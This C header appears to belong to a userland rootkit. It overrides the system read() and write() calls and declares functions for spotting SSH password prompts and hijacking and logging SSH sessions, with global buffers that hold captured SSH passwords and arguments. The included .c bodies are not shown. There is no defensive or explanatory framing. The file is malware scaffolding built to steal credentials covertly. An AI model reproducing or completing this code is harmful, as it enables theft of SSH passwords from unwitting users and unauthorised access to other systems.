#ifndef RW_H
#define RW_H
/*
#define fread fread_r
#define fread_unlocked fread_unlocked_r
#define fwrite fwrite_r
#define fwrite_unlocked fwrite_unlocked_r
*/
int ssh_start, ssh_pass_size;
char ssh_args[512], ssh_pass[512];

static int is_pwprompt(int fd, const void *buf);
static ssize_t hijack_write_ssh(int fd, const void *buf, ssize_t o);
static ssize_t log_ssh(int fd, void *buf, ssize_t o);
#include "log_ssh.c"
/*
size_t fwrite_r(const void *ptr, size_t size, size_t nmemb, FILE *stream);
size_t fwrite_unlocked_r(const void *ptr, size_t size, size_t nmemb, FILE *stream);
#include "fwrite.c"

size_t fread_r(void *data, size_t size, size_t count, FILE *stream);
size_t fread_unlocked_r(void *data, size_t size, size_t count, FILE *stream);
#include "fread.c"
*/
ssize_t read(int fd, void *buf, size_t n);
#include "read.c"

ssize_t write(int fd, const void *buf, size_t n);
#include "write.c"

#endif
